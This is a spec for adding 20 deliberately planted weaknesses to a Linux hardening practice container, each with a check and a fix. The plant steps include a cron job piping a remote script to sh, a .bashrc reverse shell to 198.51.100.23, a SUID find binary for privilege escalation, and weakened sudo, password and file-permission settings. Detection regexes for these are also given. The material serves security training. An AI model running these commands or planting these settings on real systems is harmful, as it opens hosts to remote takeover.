# RoundZero — linux-practice vulnerability expansion (10 → 30)

This spec adds **20 new planted vulnerabilities** to the existing
`agent/image/` practice box, taking it from 10 → 30 vulns for round-realism.
It's the content input for one Claude Code session; the engine and 4-state
proof harness already exist and don't change.

## Ground rules (unchanged from the existing 10)

- Every vuln = one Dockerfile injection + one check entry + one fix in the
  fix scripts. The engine's 7 check types (file_contains, file_mode, user,
  command, service, package, sshd_config) cover everything here.
- Each check maps to a real `skillNodeId` from
  `packages/content/checklists/linux-core.yaml` / `taxonomy.yaml`.
- Points: keep the existing scale (8–12 per item). New total below is
  designed so the whole 30-vuln image sums to a round number; the wiring
  session should confirm the arithmetic and set `totalPossible`
  accordingly. Suggested new points sum = 200 on top of the existing 100,
  i.e. a 300-point image — but the session may rescale to keep per-item
  weights sane. Whatever the total, the 4-state proof must still assert
  exact sums.
- Verified configs: sysctl values are CIS-aligned (rp_filter=1,
  accept_redirects=0, tcp_syncookies=1, ip_forward=0). SSH values match the
  existing merged-config (`sshd -T`) approach.

## CRITICAL wiring caveats (read before building)

1. **sysctl inside Docker.** Docker sets `net.ipv4.ip_forward=1` on the host
   and containers may inherit a read-only or Docker-managed view of some
   net.* keys. Do NOT plant/check `ip_forward` via live `sysctl` readback —
   it fights Docker. Instead, plant these as a **missing/misconfigured
   `/etc/sysctl.d/` file** and check the FILE contents (file_contains),
   exactly like the existing pwquality/faillock checks. The lesson being
   taught is "write the hardening config," which is what CyberPatriot
   actually scores. This keeps sysctl checks deterministic in a container.
2. **Services that need boot.** Some daemons (rpcbind, avahi) may not be
   truly "running" without systemd. Prefer checking them the way the
   existing telnet check works: **package installed/absent** (package type)
   or **enabled/disabled** (service type against the unit), not "actively
   running," so results are deterministic in a non-booting container.
3. **Alternate-valid-fix parity.** Where a vuln has more than one legitimate
   fix location (like the existing SSH drop-in trap), the check must credit
   any valid fix. Noted per-item below.
4. **Decoys stay sacred.** The 2 existing decoys (authorized user `zzsync`,
   required `ssh.socket`) must still pass. Add 1 new decoy below to keep the
   authorization-model lesson strong as the image grows.

---

## The 20 new vulns

Grouped by taxonomy category. Format per item:
**ID** · points · skillNodeId · planted state · check (type + logic) · fix ·
notes.

### Accounts & authentication (linux.accounts.*)

**dup-uid-service** · 10 · `linux.accounts.passwd-shadow`
- Plant: a second unauthorized non-root user sharing a UID with an existing
  account isn't needed — instead plant a system-looking account with a
  login shell that shouldn't have one: `useradd -u 1003 -s /bin/bash -M
  svc-backup` (looks like a service account but has interactive shell and
  is not in the README allowlist).
- Check (`user`): user `svc-backup` should be absent (or, softer, its shell
  should be /usr/sbin/nologin). Use absence for a clean binary.
- Fix: `userdel -f svc-backup`.
- Notes: distinct from the existing `backdoor` (UID 0) and `mallory` (sudo)
  — this teaches "unauthorized account that isn't UID 0 or sudo."

**sudo-nopasswd** · 10 · `linux.accounts.sudoers`
- Plant: a drop-in `/etc/sudoers.d/99-devops` containing
  `zzsync ALL=(ALL) NOPASSWD:ALL` (gives the *authorized* user passwordless
  root — subtle: the user is allowed, the NOPASSWD is the vuln).
- Check (`file_contains`, not-contains): no file in /etc/sudoers.d matches
  `NOPASSWD`. Implement as file_contains on `/etc/sudoers.d/99-devops` for
  `NOPASSWD` (want absent), OR a command check `grep -r NOPASSWD
  /etc/sudoers /etc/sudoers.d` returns empty.
- Fix: remove the NOPASSWD (delete the drop-in or rewrite without NOPASSWD).
- Notes: pairs with the existing `unauthorized-sudo` (mallory) but teaches
  the NOPASSWD dimension specifically.

**empty-password** · 12 · `linux.accounts.passwd-shadow`
- Plant: give an existing authorized user a blank password field in
  /etc/shadow: `passwd -d zzsync` (empty password = anyone can log in).
- Check (`command`): `awk -F: '($2==""){print $1}' /etc/shadow` returns
  empty (no accounts with blank passwords).
- Fix: set a password / lock: `usermod -p '!' zzsync` (or set a real hash).
- Notes: high-value real vuln; distinct from weak-password since it's the
  literal empty field.

**chage-maxdays** · 8 · `linux.accounts.chage`
- Plant: leave `/etc/login.defs` with `PASS_MAX_DAYS 99999` (the insecure
  default — passwords never expire).
- Check (`file_contains`): `/etc/login.defs` matches
  `^\s*PASS_MAX_DAYS\s+(?:[1-9][0-9]?|[1-9][0-9]{2}|365)\b` (a sane max like
  ≤365). Simpler: check it does NOT contain `PASS_MAX_DAYS 99999` AND does
  contain a value ≤ 365. The session can pick the cleanest regex; the fix
  target is PASS_MAX_DAYS 90.
- Fix: `sed -i 's/^PASS_MAX_DAYS.*/PASS_MAX_DAYS 90/' /etc/login.defs`.

### PAM / password policy (linux.pam.*)

**pwquality-credits** · 10 · `linux.pam.pwquality`
- Plant: the existing pwquality.conf is commented out. This item targets the
  *credit* classes specifically (separate from the existing minlen check):
  no `dcredit/ucredit/ocredit/lcredit` set.
- Check (`file_contains`): `/etc/security/pwquality.conf` matches all of
  `dcredit = -1`, `ucredit = -1`, `ocredit = -1`, `lcredit = -1` (or a
  combined regex the session designs). Want present.
- Fix: append the four credit lines.
- Notes: complements existing `pwquality-minlen`; teaches complexity vs.
  length as separate scored items (mirrors real images).

**pwhistory-remember** · 8 · `linux.pam.pwhistory`
- Plant: no `remember=` in the password stack (reuse not prevented).
- Check (`file_contains`): `/etc/security/pwhistory.conf` matches
  `^\s*remember\s*=\s*[1-9]` (24.04 reads pwhistory.conf) OR
  `/etc/pam.d/common-password` references `pam_pwhistory.so ... remember=`.
  Credit either location (alternate-valid-fix, per the 24.04 split the
  checklist already documents).
- Fix: set `remember=5` in pwhistory.conf.

### SSH (linux.ssh.*)

**ssh-maxauthtries** · 8 · `linux.ssh.limits`
- Plant: default/high MaxAuthTries (leave unset → default 6, or set to a
  high value in the drop-in).
- Check (`sshd_config`): effective `maxauthtries` ≤ 4.
- Fix: set `MaxAuthTries 4` (in the main file or the drop-in — credit merged
  config).

**ssh-x11forwarding** · 8 · `linux.ssh.limits`
- Plant: `X11Forwarding yes` in the drop-in.
- Check (`sshd_config`): effective `x11forwarding` is `no`.
- Fix: `X11Forwarding no`.
- Notes: these two SSH items reuse the proven `sshd -T` merged-config path,
  so they exercise the same alternate-fix robustness as the flagship SSH
  check. Good coverage-per-effort.

### Services & persistence (linux.services-persistence.*)

**cron-user-payload** · 10 · `linux.services-persistence.cron`
- Plant: a per-user crontab for the authorized user with a suspicious job:
  write `/var/spool/cron/crontabs/zzsync` containing
  `*/10 * * * * wget -qO- http://198.51.100.23/m | sh`.
- Check (`command`): `crontab -l -u zzsync 2>/dev/null` (or
  `cat /var/spool/cron/crontabs/zzsync`) does NOT match
  `wget .*\|\s*sh|curl .*\|\s*(ba)?sh`.
- Fix: remove the user crontab line / `crontab -r -u zzsync`.
- Notes: distinct from the existing `/etc/cron.d` malicious job — teaches
  the *user* crontab location, a spot teams miss.

**bashrc-payload** · 8 · `linux.services-persistence.rc-bashrc`
- Plant: append a reverse-shell-flavored line to `/root/.bashrc` or an
  authorized user's `.bashrc`: e.g.
  `bash -i >& /dev/tcp/198.51.100.23/4444 0>&1  # (commented or live?)`.
  Plant it as a real (not commented) trailing line so it's detectable.
- Check (`file_contains`): the target `.bashrc` does NOT match
  `/dev/tcp/|nc .* -e|bash -i >& /dev/tcp`.
- Fix: remove the offending line.
- Notes: `.bashrc`/`.profile` payloads are classic persistence; the
  existing image has none.

**rogue-authorized-key** · 10 · `linux.services-persistence.authorized-keys`
- Plant: write a bogus key into `/root/.ssh/authorized_keys` (a rogue key =
  passwordless backdoor).
- Check (`command` or `file_contains`): `/root/.ssh/authorized_keys` is
  absent or empty (no unauthorized keys). Since the README authorizes no
  keys, the clean state is "no authorized_keys entries."
- Fix: remove the key / empty the file.
- Notes: teaches "a key survives a password change," which the drill card
  already states — nice lesson linkage.

**insecure-service-vsftpd** · 10 · `linux.services-persistence.malware`
- Plant: install `vsftpd` (an insecure service not required by the README).
- Check (`package`): package `vsftpd` is absent. (Mirror the existing
  telnet check exactly.)
- Fix: `apt-get purge -y vsftpd`.
- Notes: second "prohibited service" alongside telnet, proving the pattern
  generalizes.

**rpcbind-disabled** · 8 · `linux.services-persistence.systemd-audit`
- Plant: ensure `rpcbind` is installed/enabled (unneeded network service).
- Check (`service` disabled OR `package` absent — session picks the
  deterministic one in a non-booting container): `rpcbind` disabled/absent.
- Fix: `systemctl disable --now rpcbind` or purge.
- Notes: teaches "disable unneeded daemons" generally.

### File permissions (linux.files-perms.*)

**passwd-writable** · 8 · `linux.files-perms.sensitive-modes`
- Plant: `chmod 666 /etc/passwd` (world-writable passwd = trivial account
  injection).
- Check (`file_mode`): `/etc/passwd` mode ≤ 0644.
- Fix: `chmod 644 /etc/passwd`.
- Notes: distinct from the existing shadow-mode (0644→0640) check; passwd
  world-writable is a different, severe finding.

**sudoers-mode** · 8 · `linux.files-perms.sensitive-modes`
- Plant: `chmod 777 /etc/sudoers` (should be 440).
- Check (`file_mode`): `/etc/sudoers` mode == 0440.
- Fix: `chmod 440 /etc/sudoers`.

**world-writable-dir** · 8 · `linux.files-perms.world-writable`
- Plant: create `/opt/shared` with mode 0777 and no sticky bit (world-
  writable dir where anyone can replace others' files).
- Check (`command`): `find /opt -xdev -type d -perm -0002 ! -perm -1000
  2>/dev/null` returns empty (no world-writable dirs without sticky bit).
- Fix: `chmod 0755 /opt/shared` (or add sticky: `chmod +t`).
- Notes: teaches the world-writable-without-sticky concept the checklist
  mentions but the current image doesn't plant.

**second-suid** · 8 · `linux.files-perms.suid`
- Plant: a second rogue SUID binary distinct from the existing
  `/usr/local/bin/rootbash`: `cp /usr/bin/find /usr/local/bin/qfind &&
  chmod 4755 /usr/local/bin/qfind` (SUID `find` = GTFObin privesc).
- Check (`command`): `find / -xdev -perm -4000 -type f 2>/dev/null` does NOT
  match `/usr/local/bin/qfind`.
- Fix: `chmod u-s /usr/local/bin/qfind` or remove it.
- Notes: proves the SUID check handles multiple planted binaries.

### Updates & network (linux.updates-network.*)

**sysctl-ip-forward** · 8 · `linux.updates-network.sysctl`
- Plant: a `/etc/sysctl.d/` hardening file is ABSENT (so the box has no
  sysctl hardening written). Per the wiring caveat, check the FILE, not live
  sysctl.
- Check (`file_contains`): `/etc/sysctl.d/99-roundzero.conf` matches
  `^\s*net\.ipv4\.ip_forward\s*=\s*0`. Want present.
- Fix: create the file with `net.ipv4.ip_forward = 0`.
- Notes: CIS-verified value. Do NOT check live `sysctl` (Docker owns it).

**sysctl-rp-filter** · 8 · `linux.updates-network.sysctl`
- Plant: same missing sysctl file.
- Check (`file_contains`): the sysctl file matches
  `^\s*net\.ipv4\.conf\.all\.rp_filter\s*=\s*1`.
- Fix: add the line.

**sysctl-accept-redirects** · 8 · `linux.updates-network.sysctl`
- Plant: same missing sysctl file.
- Check (`file_contains`): matches
  `^\s*net\.ipv4\.conf\.all\.accept_redirects\s*=\s*0`.
- Fix: add the line.
- Notes: these three sysctl items all target the SAME file, so fixing them
  is "write the hardening config" — realistic, and they exercise the
  file_contains type with multi-line configs. CIS-verified values. Consider
  a single fix that writes all three lines (partial-credit test: writing
  only one line credits only that check).

### New decoy (keep the authorization lesson strong)

**decoy-required-cron** · 0 · `linux.services-persistence.cron`
- Plant: a LEGITIMATE cron job the README requires, e.g.
  `/etc/cron.d/backup` running `/usr/local/bin/backup.sh` nightly (benign,
  authorized).
- Check (`file_contains`, want present): `/etc/cron.d/backup` exists and
  contains `backup.sh`. Zero points — but if a student deletes it (over-
  zealous cron cleanup), this decoy FAILS, teaching "don't remove authorized
  jobs." Mirror the existing decoy pattern (informational, not scored, but
  visible in the report).

---

## Category coverage after expansion (30 vulns)

| Category | Existing | New | Total |
|---|---|---|---|
| Accounts & auth | 2 | 4 | 6 |
| PAM / policy | 2 | 2 | 4 |
| SSH | 1 | 2 | 3 |
| Services & persistence | 2 | 5 | 7 |
| File permissions | 2 | 4 | 6 |
| Updates & network | 1 | 3 | 4 |
| **Scored total** | **10** | **20** | **30** |
| Decoys | 2 | 1 | 3 |

Every taxonomy category the Linux checklist covers now has multiple planted
vulns — the practice box finally feels like a real round.

## What the wiring session must prove (unchanged discipline)

Re-run `agent/scripts/prove.sh` (extended) and assert exact scores in all
four states, now across 30 checks:
1. Fresh box: exactly the 30 planted vulns fail, 3 decoys pass, score = 0.
2. Fully hardened (extend fix-all.sh): 30/30, full points.
3. Half-fixed: fix a defined subset, assert the score is EXACTLY that
   subset's sum (no partial credit) — include one of the multi-line sysctl
   items to prove partial writes credit partially.
4. Alternate-valid-fix: the SSH items (maxauthtries, x11forwarding) fixed via
   the drop-in still credit via merged config; the pwhistory item credited
   via either location.
Plus Go unit tests for any new check-type edge cases (none expected — all 20
reuse existing types, which is the point).
